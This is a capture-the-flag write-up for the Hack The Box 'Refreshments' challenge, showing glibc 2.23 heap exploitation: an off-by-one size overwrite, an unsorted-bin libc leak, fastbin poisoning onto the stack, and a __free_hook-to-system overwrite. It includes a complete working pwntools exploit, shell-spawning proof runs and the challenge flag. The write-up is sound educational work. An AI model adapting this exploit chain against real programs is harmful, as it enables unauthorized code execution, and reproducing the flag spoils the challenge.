@@ -1,0 +1,628 @@
+---
+title: "Hack The Box 2025 – Refreshments (StackSmash)"
+description: "glibc 2.23 heap exploitation with an off-by-one overflow, unsorted-bin leaks, fastbin manipulation, stack chunk placement, and __free_hook → system."
+publishDate: 2025-08-04
+tags: ["Pwn", "heap-exploitation", "glibc-2.23", "fastbin", "unsorted-bin", "uaf", "hackthebox"]
+featured: false
+img: "/assets/blog/stacksmash.jpg"
+img_alt: "HTB Refreshments Binary Exploitation write-up"
+---
+
+## Overview
+This challenge revisits **classic glibc 2.23 heap exploitation** (no tcache). The core bug is a **one-byte heap overflow** in the edit routine (`read(..., 0x59)` into a `0x58` buffer). That single byte is enough to corrupt a neighboring chunk’s `size` field, enabling an **unsorted bin leak** of `main_arena` pointers. With libc base known, a **fastbin attack** is used to gain controlled allocations, leak the stack, place a chunk on the stack, and finally overwrite `__free_hook` with `system` to trigger `system("/bin/sh")` via `free()`.
+
+---
+
+## Refreshments (StackSmash 2025)
+
+### Challenge Description
+On a blazing summer day in the Shroom Kingdom, beat the heat with our refreshing juice — it’s as bright as a Sun Flower! In our Toadstool Stand, you’re not just limited to one sip. Try a mix of free samples, or channel your inner alchemist like Toadsworth by blending it with other delightful beverages. The adventure for your taste buds awaits — power up and enjoy! ✨
+
+---
+
+## Provided Files and Environment
+We are given a 64-bit binary called `refreshments`:
+
+```text
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+RUNPATH:    b'./glibc/'
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+
+Moreover, we are also given **Glibc 2.23**, and the binary is already patched to use this library and loader:
+
+```text
+$ ./glibc/ld-linux-x86-64.so.2 ./glibc/libc.so.6
+GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 7.5.0.
+Available extensions:
+        crypt add-on version 2.1 by Michael Glad and others
+        GNU Libidn by Simon Josefsson
+        Native POSIX Threads Library by Ulrich Drepper et al
+        BIND-8.2.3-T5B
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/libc/bugs.html>.
+```
+
+Glibc 2.23 is quite old, so this challenge is expected to revisit older heap techniques.
+
+---
+
+## Reverse Engineering
+
+### Main Function (IDA View)
+Opening the binary in IDA, the `main()` function looks like this (trimmed only for readability, logic preserved):
+
+```c
+int __fastcall __noreturn main(int argc, const char** argv, const char** envp) {
+  unsigned __int64 option; // rax
+  char count; // [rsp+7h] [rbp-79h]
+  unsigned __int64 free_index; // [rsp+8h] [rbp-78h]
+  unsigned __int64 edit_index; // [rsp+8h] [rbp-78h]
+  unsigned __int64 view_index; // [rsp+8h] [rbp-78h]
+  void* ptr[14]; // [rsp+10h] [rbp-70h] BYREF
+
+  ptr[11] = (void*) __readfsqword(0x28u);
+  setup(argc, argv, envp);
+  banner();
+  memset(ptr, 0, 0x50);
+  count = 0;
+
+  while (1) {
+    while (1) {
+      printf(aMenu, (unsigned int) count);
+      option = read_num();
+
+      if (option != 4)
+        break;
+
+      printf("\nChoose glass: ");
+      view_index = read_num();
+
+      if (view_index >= count)
+        goto LABEL_27;
+
+      if (ptr[view_index]) {
+        printf("\nGlass content: ");
+        write(1, ptr[view_index], 0x58u);
+        putchar('\n');
+      } else {
+        error("Cannot view empty glass!");
+      }
+    }
+
+    if (option > 4)
+      goto LABEL_28;
+
+    switch (option) {
+      case 3uLL:
+        printf("\nChoose glass to customize: ");
+        edit_index = read_num();
+
+        if (edit_index >= count)
+          goto LABEL_27;
+
+        if (ptr[edit_index]) {
+          printf("\nAdd another drink: ");
+          read(0, ptr[edit_index], 0x59u);
+          putchar('\n');
+        } else {
+          error("Cannot customize empty glass!");
+        }
+
+        break;
+
+      case 1uLL:
+        if (count > 15) {
+          error("You cannot take any more glasses!");
+          exit(69);
+        }
+
+        ptr[count] = calloc(1u, 0x58u);
+
+        if (ptr[count]) {
+          count++;
+          printf("\nHere is your refreshing juice!\n\n");
+        } else {
+          error("Something went wrong with the juice!");
+        }
+
+        break;
+
+      case 2uLL:
+        printf("\nChoose glass to empty: ");
+        free_index = read_num();
+
+        if (free_index >= count) {
+LABEL_27:
+          error("This glass is unavailable!");
+        } else if (ptr[free_index]) {
+          free(ptr[free_index]);
+          ptr[free_index] = 0;
+          puts("\nGlass is empty now!\n");
+        } else {
+          error("This glass is already empty!");
+        }
+
+        break;
+
+      default:
+LABEL_28:
+        error("Have a great day!\n");
+        exit(69);
+    }
+  }
+}
+```
+
+### Menu Output
+```text
+It's too hot.. Drink a juice Jumpio.. Or 2.. Or 10!
+
+Menu:
+
+███████████████████████████
+█                         █
+█ 1. Fill  glass (0 / 10) █
+█ 2. Empty glass          █
+█ 3. Edit  glass          █
+█ 4. View  glass          █
+█ 5. Exit                 █
+█                         █
+███████████████████████████
+```
+
+Essentially: **create, delete, edit and read**.
+
+---
+
+## Heap Operations (Behavior & Observations)
+
+### Create Function
+This is the routine that creates chunks:
+
+```c
+ptr[count] = calloc(1u, 0x58u);
+```
+
+Not much to say about this. It creates a **0x61-sized chunk** (`0x58` gets rounded to `0x60`, and the `1` is the `PREV_INUSE` flag). Notice that the program uses `calloc`, so it will erase the chunk’s content before returning control to the user. After that, the reference is added to the list `ptr`, which is an array allocated on the stack.
+
+Also, it is strange that the program allocates `ptr[14]` (index `0..13`), but `count` can go until `15`, so we can use index `14` out of bounds. This might sound promising to target saved return addresses, but there is no return from `main()` because it calls `exit(69)`.
+
+Curiously, the canary is set on `ptr[11]`, and `memset` only erases 10 slots of `ptr` (`0x50` bytes).
+
+### Delete Function
+The following code allows us to free chunks:
+
+```c
+free(ptr[free_index]);
+ptr[free_index] = 0;
+```
+
+It ensures index `< count` and the slot is non-empty. Then it frees the chunk and removes the reference from `ptr`.
+
+### Edit Function
+This is how we can edit chunks:
+
+```c
+read(0, ptr[edit_index], 0x59u);
+```
+
+Here we have a **one-byte overflow** (off-by-one) because we are dealing with `0x61`-sized chunks, whose usable size is `0x58`. As a result, we can fill up the whole chunk and write **one extra byte** outside, which may modify the adjacent chunk metadata.
+
+### Show Function
+The view routine prints contents with a fixed size:
+
+```c
+write(1, ptr[view_index], 0x58u);
+```
+
+This always prints exactly `0x58` bytes. Even if the chunk contains null bytes, the leak is reliable.
+
+---
+
+## Exploit Strategy (Initial Notes)
+When I solved this challenge, I did not follow a single fixed strategy, but the following ideas guided the chain:
+
+- Fixed allocation size: `calloc(1, 0x58)` → no size control
+- `calloc()` zeroing prevents “read-after-free into user data” tricks in the usual way
+- Off-by-one can corrupt the next chunk’s size → create an overlapping larger chunk
+- Freed `0xc1` chunk goes to **unsorted bin**, which stores pointers to `main_arena` → libc leak
+- With a leak + UAF-like overlap, fastbin attacks become feasible
+- Different address ranges locally (Ubuntu 24.04) vs remote (Ubuntu 22.04) affect reliability
+
+I include both the exploration and the final approach below.
+
+---
+
+## Exploit Development
+
+### Helper Functions
+```python
+def create(option = b'1\n'):
+    io.sendafter(b'>> ', option)
+
+
+def delete(index: int):
+    io.sendlineafter(b'>> ', b'2')
+    io.sendlineafter(b'Choose glass to empty: ', str(index).encode())
+
+
+def edit(index: int, data: bytes):
+    io.sendlineafter(b'>> ', b'3')
+    io.sendlineafter(b'Choose glass to customize: ', str(index).encode())
+    io.sendafter(b'Add another drink: ', data)
+
+
+def show(index: int) -> bytes:
+    io.sendlineafter(b'>> ', b'4')
+    io.sendlineafter(b'Choose glass: ', str(index).encode())
+    io.recvuntil(b'Glass content: ')
+    return io.recvuntil(b'\nMenu:', drop=True)
+```
+
+---
+
+## Leaking Memory Addresses
+
+### Step 1: Forge a `0xc1` chunk via off-by-one
+We allocate four chunks, then use the off-by-one to overwrite the next chunk’s size to `0xc1`:
+
+```python
+create()  # 0
+create()  # 1
+create()  # 2
+create()  # 3
+
+edit(0, b'\0' * 0x58 + b'\xc1')
+```
+
+GDB (GEF) interprets the heap layout as if we had 3 chunks (`0x61`, `0xc1`, `0x61`) although we still have 4 pointers.
+
+Example output (trimmed from the session):
+
+```text
+gef> visual-heap -n
+[+] No tcache in this version of libc
+0x6229503cb000|+0x00000|...: ... 0x0000000000000061
+...
+0x6229503cb060|+0x00060|...: ... 0x00000000000000c1
+...
+0x6229503cb0c0|+0x000c0|...: ... 0x0000000000000061
+...
+```
+
+Stack snapshot showing the `ptr[]` references and canary location:
+
+```text
+gef> stack
+0x7ffeb787eb00|+0x0010|+002: 0x00006229503cb010
+0x7ffeb787eb08|+0x0018|+003: 0x00006229503cb070
+0x7ffeb787eb10|+0x0020|+004: 0x00006229503cb0d0
+0x7ffeb787eb18|+0x0028|+005: 0x00006229503cb130
+...
+0x7ffeb787eb58|+0x0068|+013: 0x64fc66c8ed3ebf00  <- canary
+```
+
+Now free the forged chunk:
+
+```python
+delete(1)
+```
+
+This moves it to the unsorted bin and writes `main_arena` pointers into the freed chunk:
+
+```text
+gef> bins
+Unsorted Bin:
+ -> Chunk(... size=0xc0 ... fd=... <main_arena+0x58>, bk=... <main_arena+0x58>)
+```
+
+### Step 2: Force allocator updates and leak libc with `show()`
+We cannot trivially leak by re-allocating the same chunk because `calloc` clears. Instead, allocate another chunk so the unsorted chunk is split and pointers land in an overlapped region reachable via `ptr[2]`:
+
+```python
+create()  # 4
+```
+
+Now we can read the leaked pointer with `show(2)`:
+
+```python
+glibc.address = u64(show(2)[:8]) - glibc.sym.main_arena - 88
+io.success(f'Glibc base address: {hex(glibc.address)}')
+```
+
+At this point, libc base is reliable.
+
+Before continuing, we drain unsorted and keep the remaining chunk as fastbin:
+
+```python
+create()  # 5
+delete(2)
+```
+
+---
+
+## Fastbin Attack
+
+Fastbin attacks in glibc 2.23 are conceptually close to tcache poisoning: we corrupt the singly-linked list pointer (`fd`) so that allocations return a controlled address. The limitation is that our chunk size is fixed (`0x61`), so the target address must appear like a valid chunk for this size class.
+
+A typical target above `__malloc_hook` uses a `0x71` size trick, but here we cannot pick sizes. This forced a different approach.
+
+---
+
+## Local Approach (Ubuntu 24.04) and Why Remote Failed
+Under Ubuntu 24.04, libc/PIE/heap ranges are wider, and the exploit sometimes relied on address bytes like `0x60/0x61` being present in convenient locations. Remotely, the environment behaved differently, so this approach was unreliable.
+
+For completeness, here is the (local) reasoning around `main_arena` and using a chunk-shape near it (example commands from the analysis):
+
+```text
+gef> x/20gx &main_arena
+0x708552d99b20 <main_arena>:    0x0000000000000000      0x0000000000000000
+...
+0x708552d99b40 <main_arena+32>: 0x0000000000000000      0x0000563cc1b900c0
+...
+```
+
+Then experimenting with forcing a size marker and using `main_arena+5` as a chunk-shape (example):
+
+```text
+gef> set *(unsigned long*)0x7f80e3599b28 = 0x000061aaaaaaaaaa
+...
+gef> x/20gx 0x7f80e3599b20 + 5
+0x7f80e3599b25 <main_arena+5>:  0xaaaaaaaaaa000000      0x0000000000000061
+...
+```
+
+This was workable locally but did not hold up remotely due to address distribution.
+
+---
+
+## Remote Approach (Ubuntu 22.04-Compatible): Loader Region Trick
+To match the remote behavior, I switched to Ubuntu 22.04 and adjusted the exploit. The key difficulty: **finding any memory region that contains a byte which can serve as a valid `0x61`-family size marker** for the fixed-size fastbin attack.
+
+After scanning multiple rw- regions (libc, heap, loader), a useful region was found inside the loader (`ld-linux-x86-64.so.2`) containing a `0x6f` and also pointers to vDSO and stack.
+
+Example memory view:
+
+```text
+gef> x/20gx $libc + 0x5c1c20 - 0x20
+0x7f0b3c0b0c00 <dyn_temp+32>:   0x0000000000000006      0x00007ffdd0db41c8
+0x7f0b3c0b0c10 <dyn_temp+48>:   0x000000006ffffff0      0x00007ffdd0db438c
+0x7f0b3c0b0c20 <dyn_temp+64>:   0x000000006ffffef5      0x00007ffdd0db4168
+...
+```
+
+And highlighting the region aligned as a “chunk”:
+
+```text
+gef> x/12gx $libc + 0x5c1c20 - 5
+0x7f0b3c0b0c1b <dyn_temp+59>:   0xfffef500007ffdd0  0xdb4168000000006f
+...
+```
+
+Even though we cannot dump the entire stack pointer directly with `show()`, we can reconstruct it because the upper bytes match vDSO mapping ranges.
+
+VDSO/stack layout example:
+
+```text
+gef> vmmap
+0x0000564b965a0000 ... rw- [heap]
+0x00007ffdd0d66000 ... rw- [stack]
+0x00007ffdd0db4000 ... r-x [vdso]
+```
+
+---
+
+## Stack Leak and Offset Calibration
+We use the loader region to leak a pointer and compute the stack address relative to the main frame:
+
+```text
+gef> p/x 0x00007ffdd0d866b8 - 0x7ffdd0d86550
+$3 = 0x168
+```
+
+Implementation:
+
+```python
+edit(5, p64(glibc.address + 0x5c1c20 - 5))
+
+create()  # 6
+create()  # 7
+
+data = show(7)
+stack_addr = u64(data[-3:] + data[:5]) - 0x168
+io.success(f'Stack address: {hex(stack_addr)}')
+```
+
+---
+
+## read_num() Trick: Planting a Size Byte on the Stack
+At first, the plan was to allocate on stack and pivot pointers. The missing piece was a valid “size byte” for the fastbin to treat a target as a chunk. Then I noticed `read_num()` leaves a 32-byte buffer on the stack. We can inject something like:
+
+- `b"1\0 ... \x61"`
+
+So `strtoul()` parses `1`, but we still place an extra byte on the stack buffer.
+
+However, using `0x61` caused `calloc` to wipe a critical stack region (including return addresses), crashing the program. To prevent clearing, we can set the mmap bit by using `0x62`.
+
+This also explains why earlier tests with `0x6f` did not wipe memory: it effectively triggers the `IS_MMAPPED` bit behavior, so the allocator path differs and avoids zeroing the region the same way.
+
+Implementation sequence (as used in the final exploit):
+
+```python
+delete(0)
+delete(5)
+edit(6, p64(stack_addr - 0x38))
+
+create()  # 8
+create(option=b'1' + b'\0' * 15 + b'\x62')
+```
+
+---
+
+## Gaining Code Execution (__free_hook → system)
+Once a chunk is placed on the stack, we can pivot a pointer in `ptr[]` to `__free_hook` and overwrite it:
+
+```python
+data = show(9)[:0x38]
+edit(9, data + p64(glibc.sym.__free_hook))
+edit(0, p64(glibc.sym.system))
+edit(8, b'/bin/sh\0')
+delete(8)
+```
+
+This triggers `system("/bin/sh")` when freeing the chunk containing `/bin/sh`.
+
+---
+
+## Full solve.py (Final)
+Below is the exact `solve.py` you provided, preserved and formatted:
+
+```python
+from pwn import context, ELF, p64, remote, sys, u64
+
+context.binary = 'refreshments'
+glibc = ELF('glibc/libc.so.6', checksec=False)
+
+
+def get_process():
+    if len(sys.argv) == 1:
+        return context.binary.process()
+
+    host, port = sys.argv[1], sys.argv[2]
+    return remote(host, port)
+
+
+def create(option = b'1\n'):
+    io.sendafter(b'>> ', option)
+
+
+def delete(index: int):
+    io.sendlineafter(b'>> ', b'2')
+    io.sendlineafter(b'Choose glass to empty: ', str(index).encode())
+
+
+def edit(index: int, data: bytes):
+    io.sendlineafter(b'>> ', b'3')
+    io.sendlineafter(b'Choose glass to customize: ', str(index).encode())
+    io.sendafter(b'Add another drink: ', data)
+
+
+def show(index: int) -> bytes:
+    io.sendlineafter(b'>> ', b'4')
+    io.sendlineafter(b'Choose glass: ', str(index).encode())
+    io.recvuntil(b'Glass content: ')
+    return io.recvuntil(b'\nMenu:', drop=True)
+
+
+io = get_process()
+
+create()  # 0
+create()  # 1
+create()  # 2
+create()  # 3
+
+edit(0, b'\0' * 0x58 + b'\xc1')
+delete(1)
+
+create()  # 4
+
+glibc.address = u64(show(2)[:8]) - glibc.sym.main_arena - 88
+io.success(f'Glibc base address: {hex(glibc.address)}')
+
+create()  # 5
+delete(2)
+
+edit(5, p64(glibc.address + 0x5c1c20 - 5))
+
+create()  # 6
+create()  # 7
+
+data = show(7)
+stack_addr = u64(data[-3:] + data[:5]) - 0x168  # combine vdso address (MSB) and stack address (LSB)
+io.success(f'Stack address: {hex(stack_addr)}')
+
+delete(0)
+delete(5)
+edit(6, p64(stack_addr - 0x38))
+
+create()  # 8
+create(option=b'1' + b'\0' * 15 + b'\x62')  # 9 (mmap-ed chunk to prevent calloc from erasing the chunk)
+
+data = show(9)[:0x38]
+edit(9, data + p64(glibc.sym.__free_hook))
+edit(0, p64(glibc.sym.system))
+edit(8, b'/bin/sh\0')
+delete(8)
+
+io.interactive()
+```
+
+---
+
+## Proof of Exploitation
+
+### Local / Docker
+```text
+$ python3 solve.py
+[*] './refreshments'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'./glibc/'
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Starting local process './refreshments': pid 470495
+[+] Glibc base address: 0x7fc81d0d3000
+[+] Stack address: 0x7ffce03ada20
+[*] Switching to interactive mode
+$ whoami
+ramveil
+```
+
+### Remote
+```text
+$ python3 solve.py 83.136.255.102 35513
+[*] './refreshments'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'./glibc/'
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Opening connection to 83.136.255.102 on port 35513: Done
+[+] Glibc base address: 0x7fbc1ad92000
+[+] Stack address: 0x7ffdf47f81b0
+[*] Switching to interactive mode
+$ ls
+flag.txt
+glibc
+refreshments
+$ cat flag.txt
+HTB{0ld_sch00l_t3chn1qu35_n3v3r_d13}
+```
+
+---
+
+## Flag
+```text
+HTB{0ld_sch00l_t3chn1qu35_n3v3r_d13}
+```
